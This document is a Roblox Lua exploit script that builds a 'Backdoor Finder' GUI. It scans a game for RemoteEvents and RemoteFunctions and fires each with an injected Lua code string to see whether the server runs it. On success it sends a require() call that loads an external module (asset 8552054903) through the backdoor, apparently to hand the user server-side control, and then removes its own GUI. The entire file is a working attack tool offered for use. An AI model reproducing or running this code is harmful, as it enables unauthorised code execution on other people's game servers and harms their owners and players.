-- Gui to Lua
-- Version: 3.2

-- Instances:

local BackdoorFinder = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local ae = Instance.new("ScrollingFrame")
local UIListLayout = Instance.new("UIListLayout")
local attacc = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")
local All = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local NoMessage = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local Remote = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local Function = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")
local Button = Instance.new("TextButton")
local Object = Instance.new("ObjectValue")
local UICorner_7 = Instance.new("UICorner")

--Properties:

BackdoorFinder.Name = "BackdoorFinder"
BackdoorFinder.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
BackdoorFinder.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
BackdoorFinder.ResetOnSpawn = false

Frame.Parent = BackdoorFinder
Frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
Frame.ClipsDescendants = true
Frame.Position = UDim2.new(0.252229363, 0, 0.0699152574, 0)
Frame.Size = UDim2.new(0, 311, 0, 335)

UICorner.Parent = Frame

ae.Name = "ae"
ae.Parent = Frame
ae.Active = true
ae.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
ae.Position = UDim2.new(0.286918581, 0, 0.0466248579, 0)
ae.Size = UDim2.new(0, 209, 0, 251)
ae.CanvasSize = UDim2.new(0, 0, 0, 24)
ae.ScrollBarThickness = 8

UIListLayout.Parent = ae
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 5)

attacc.Name = "attacc"
attacc.Parent = Frame
attacc.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
attacc.Position = UDim2.new(0.286918581, 0, 0.844571471, 0)
attacc.Size = UDim2.new(0, 208, 0, 36)
attacc.Font = Enum.Font.GothamSemibold
attacc.Text = "Attack"
attacc.TextColor3 = Color3.fromRGB(255, 255, 255)
attacc.TextSize = 14.000

UICorner_2.Parent = attacc

All.Name = "All"
All.Parent = Frame
All.BackgroundColor3 = Color3.fromRGB(125, 125, 125)
All.Position = UDim2.new(0.0225080382, 0, 0.0774073452, 0)
All.Size = UDim2.new(0, 75, 0, 26)
All.Font = Enum.Font.GothamSemibold
All.Text = "Toggle All"
All.TextColor3 = Color3.fromRGB(255, 255, 255)
All.TextSize = 14.000

UICorner_3.Parent = All

NoMessage.Name = "NoMessage"
NoMessage.Parent = Frame
NoMessage.BackgroundColor3 = Color3.fromRGB(125, 125, 125)
NoMessage.Position = UDim2.new(0.0225080382, 0, 0.208750635, 0)
NoMessage.Size = UDim2.new(0, 75, 0, 26)
NoMessage.Font = Enum.Font.GothamSemibold
NoMessage.Text = "No Message"
NoMessage.TextColor3 = Color3.fromRGB(255, 255, 255)
NoMessage.TextSize = 13.000

UICorner_4.Parent = NoMessage

Remote.Name = "Remote"
Remote.Parent = Frame
Remote.BackgroundColor3 = Color3.fromRGB(125, 125, 125)
Remote.Position = UDim2.new(0.0225080382, 0, 0.33710885, 0)
Remote.Size = UDim2.new(0, 75, 0, 26)
Remote.Font = Enum.Font.GothamSemibold
Remote.Text = "Remote Event"
Remote.TextColor3 = Color3.fromRGB(255, 255, 255)
Remote.TextSize = 10.000

UICorner_5.Parent = Remote

Function.Name = "Function"
Function.Parent = Frame
Function.BackgroundColor3 = Color3.fromRGB(125, 125, 125)
Function.Position = UDim2.new(0.0225080382, 0, 0.459496915, 0)
Function.Size = UDim2.new(0, 75, 0, 26)
Function.Font = Enum.Font.GothamSemibold
Function.Text = "Remote Function"
Function.TextColor3 = Color3.fromRGB(255, 255, 255)

UICorner_6.Parent = Function

Button.Name = "Button"
Button.Parent = Frame
Button.BackgroundColor3 = Color3.fromRGB(125, 125, 125)
Button.Position = UDim2.new(0.26134333, 0, 1.03561616, 0)
Button.Size = UDim2.new(0, 209, 0, 24)
Button.Font = Enum.Font.GothamSemibold
Button.TextColor3 = Color3.fromRGB(255, 255, 255)
Button.TextSize = 14.000

UICorner_7.Parent = Button

Object.Name = "Object"
Object.Parent = Button

-- Scripts:

local function PHQEJ_fake_script() -- Frame.ScrollHandler 
	local script = Instance.new('LocalScript', Frame)

	local Scroller = script.Parent.ae
	
	local function AntiAdonis(x)
		local ReturnValue = false
		if #x:GetChildren() ~= 0 then
			for _, v in pairs(x:GetChildren()) do
				if string.lower(v.Name) == "__function" then
					ReturnValue = true
				end
			end
		end
		return ReturnValue
	end
	
	
	function color(Part, Color, tim)
		if tim == nil then
			tim = 1
		end
		local TS = game:GetService("TweenService")
		local Info = TweenInfo.new(tim, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, 0, false, 0)
		TS:Create(Part, Info, {BackgroundColor3 = Color}):Play()
	end
	
	
	for _,v in pairs(game:GetDescendants()) do
		if v:IsA("RemoteEvent") and not AntiAdonis(v) or (v:IsA("RemoteFunction") and string.lower(v.Name) ~= "__function") then
		local button = script.Parent.Button:Clone()
		button.Text = v.Name
			button.Parent = script.Parent.ae
			button.Object.Value = v
			button:SetAttribute("on", false)
			Scroller.CanvasSize = UDim2.fromOffset(Scroller.CanvasSize.X.Offset,Scroller.CanvasSize.Y.Offset+28)
		end
	end
	
	for _,v in pairs(script.Parent.ae:GetChildren()) do
		if v:IsA("GuiButton") then
			v.Activated:Connect(function()
				local on = v:GetAttribute("on")
				if on == false then
					v:SetAttribute("on", true)
					color(v, Color3.fromRGB(255, 0, 0), 0.2)
				else
					v:SetAttribute("on", false)
					color(v, Color3.fromRGB(125, 125, 125), 0.2)
				end
			end)
		end
	end
	
	script.Parent.All.Activated:Connect(function()
		for _,v in pairs(script.Parent.ae:GetChildren()) do
			if v:IsA("GuiButton") then
				local on = v:GetAttribute("on")
				v:SetAttribute("on", not on)
				if on == false then
					color(v, Color3.fromRGB(255, 0, 0), 0.2)
				else
					color(v, Color3.fromRGB(125, 125, 125), 0.2)
				end
			end
		end
	end)
	
	script.Parent.NoMessage.Activated:Connect(function()
		for _,v in pairs(script.Parent.ae:GetChildren()) do
			if v:IsA("GuiButton") then
				local a = v.Object.Value
				if a.Parent == game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents then
					v:SetAttribute("on", false)
					color(v, Color3.fromRGB(125, 125, 125), 0.2)
				else
					local on = v:GetAttribute("on")
					v:SetAttribute("on", not on)
					if v:GetAttribute("on") == true then
						color(v, Color3.fromRGB(255, 0, 0), 0.2)
					else
		                color(v, Color3.fromRGB(125, 125, 125), 0.2)
					end
				end
			end
		end
	end)
	
	script.Parent.Remote.Activated:Connect(function()
		for _,v in pairs(script.Parent.ae:GetChildren()) do
			if v:IsA("GuiButton") then
				if v.Object.Value:IsA("RemoteEvent") then
					local on = v:GetAttribute("on")
					v:SetAttribute("on", not on)
					if on == false then
						color(v, Color3.fromRGB(255, 0, 0), 0.2)
					else
						color(v, Color3.fromRGB(125, 125, 125), 0.2)
					end
				end
			end
		end
	end)
	
	script.Parent.Function.Activated:Connect(function()
		for _,v in pairs(script.Parent.ae:GetChildren()) do
			if v:IsA("GuiButton") then
				if v.Object.Value:IsA("RemoteFunction") then
				local on = v:GetAttribute("on")
				v:SetAttribute("on", not on)
				if on == false then
					color(v, Color3.fromRGB(255, 0, 0), 0.2)
				else
					color(v, Color3.fromRGB(125, 125, 125), 0.2)
					end
				end
			end
		end
	end)
end
coroutine.wrap(PHQEJ_fake_script)()
local function EDFU_fake_script() -- attacc.LocalScript 
	local script = Instance.new('LocalScript', attacc)

	local blacklist = {}
	local gotbackdoor = false
	local Backdoor = ""
	local Dict = {}
	local checking = false
	local LocalPlayer = game:GetService("Players").LocalPlayer.Name
	
	function notify(text)
		game.StarterGui:SetCore("SendNotification", {
			Title = "Backdoor Finder";
			Text = text; 
		})
	end
	
	
	function Rnd(NmbRnd, Min, Max)
		local ToTxt = ""
		for i = 1, NmbRnd do
			ToTxt = ToTxt..string.char(math.random(Min, Max))
		end
		return ToTxt
	end
	
	local GenScript = function(Remote)
		return [[i=Instance.new("StringValue", game:GetService("Workspace")) i.Name="Camera" i.Value="]]..tostring(Remote)..[["]]
	end	
	
	
	function color(Part, Color, tim)
		if tim == nil then
			tim = 1
		end
		local TS = game:GetService("TweenService")
		local Info = TweenInfo.new(tim, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, 0, false, 0)
		TS:Create(Part, Info, {BackgroundColor3 = Color}):Play()
	end
	
	local function hasKeyword(s)
		for _, keyword in ipairs(blacklist) do
			if s == keyword then
				return true
			end
		end
		return false
	end
	
	
	
	local checkremote = function()
		local Remotes = script.Parent.Parent.ae
		local b = game:GetService("ServerScriptService"):FindFirstChild("ExecuteOnStart")
		if b then
			notify("Backdoor.exe detected.")
			for _,v in pairs(game:GetService("Workspace"):GetChildren()) do
				if v.Name == "RemoteEvent" and v.Parent == game:GetService("Workspace") and #v:GetChildren() == 0 then
					table.insert(blacklist, v)
				end
			end
		end
		for _,a in pairs(Remotes:GetChildren()) do
			if a:IsA("GuiButton") and a:GetAttribute("on") == true and a.Object.Value:IsA("RemoteEvent") then
				local v = a.Object.Value
				if v:IsA("RemoteEvent") and hasKeyword(v) == false and #v:GetChildren() == 0 then
					print("[REMOTE CHECK] =>", v.Name)
					Dict[tostring(v:GetFullName())] = v
					v:FireServer(GenScript(v:GetFullName()))
					wait(0.04)
				end
			end
	
		end
	end
	
	local checkfunction = function()
		local Remotes = script.Parent.Parent.ae
		for _,a in pairs(Remotes:GetChildren()) do
			if a:IsA("GuiButton") and a:GetAttribute("on") == true and a.Object.Value:IsA("RemoteFunction") then
				local v = a.Object.Value
				if v:IsA("RemoteFunction") and hasKeyword(v.Name) == false and #v:GetChildren() == 0 then
					print(v.Name)
					Dict[tostring(v:GetFullName())] = v
					v:InvokeServer(GenScript(v:GetFullName()))
					wait(0.04)
				end
			end
	
		end
	end
	
	function check()
		if gotbackdoor == true then
			return
		end
	
		checkremote()
	
		for _,v in pairs(game:GetService("Workspace"):GetChildren()) do
			if v.Name == "Camera" and v:IsA("StringValue") then
				local NewInstance = Dict[v.Value]
				Backdoor = NewInstance
				gotbackdoor = true
				v:Destroy()
			end
		end
		return gotbackdoor
	end
	
	
	function check2()
		if gotbackdoor == true then
			return
		end
	
		checkfunction()
	
		for _,v in pairs(game:GetService("Workspace"):GetChildren()) do
			if v.Name == "Camera" and v:IsA("StringValue") then
				local NewInstance = Dict[v.Value]
				Backdoor = NewInstance
				print(Backdoor)
				gotbackdoor = true
				v:Destroy()
			end
		end
		return gotbackdoor
	end
	
	
	script.Parent.MouseEnter:Connect(function()
		color(script.Parent, Color3.fromRGB(255, 0, 0), 0.2)
	end)
	
	script.Parent.MouseLeave:Connect(function()
		color(script.Parent, Color3.fromRGB(0, 255, 0), 0.2)
	end)
	
	script.Parent.Activated:Connect(function()
		if checking == true then return end
		if gotbackdoor == true then return end
		checking = true
		if check() then
			print("[BACKDOOR] =>", Backdoor:GetFullName())
			notify("Found a vulnerable Remote !")
			Backdoor:FireServer([[require(8552054903).balls("]]..LocalPlayer..[[")]])
			script.Parent.Parent.Parent:Destroy()
			checking = false
		else
			notify("Didn't found any remotes.\nTrying Remote Function.")
			wait(1)
			if check2() == false then
				print("[BACKDOOR] =>", "None")
				notify("Game/Remote isn't vulnerable...")
				checking = false
			else
				print("[BACKDOOR] =>", Backdoor:GetFullName())
				notify("Found a vulnerable Function !")
				Backdoor:InvokeServer([[require(8552054903).balls("]]..LocalPlayer..[[")]])
				script.Parent.Parent.Parent:Destroy()
				checking = false
			end
		end
	end)
end
coroutine.wrap(EDFU_fake_script)()
local function KCBILJF_fake_script() -- Frame.Dragify 
	local script = Instance.new('LocalScript', Frame)

	local UIS = game:GetService("UserInputService")
	function dragify(Frame)
	    dragToggle = nil
	    local dragSpeed = 0
	    dragInput = nil
	    dragStart = nil
	    local dragPos = nil
	    function updateInput(input)
	        local Delta = input.Position - dragStart
	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.25), {Position = Position}):Play()
	    end
	    Frame.InputBegan:Connect(function(input)
	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
	            dragToggle = true
	            dragStart = input.Position
	            startPos = Frame.Position
	            input.Changed:Connect(function()
	                if input.UserInputState == Enum.UserInputState.End then
	                    dragToggle = false
	                end
	            end)
	        end
	    end)
	    Frame.InputChanged:Connect(function(input)
	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
	            dragInput = input
	        end
	    end)
	    game:GetService("UserInputService").InputChanged:Connect(function(input)
	        if input == dragInput and dragToggle then
	            updateInput(input)
	        end
	    end)
	end
	
	dragify(script.Parent)
end
coroutine.wrap(KCBILJF_fake_script)()
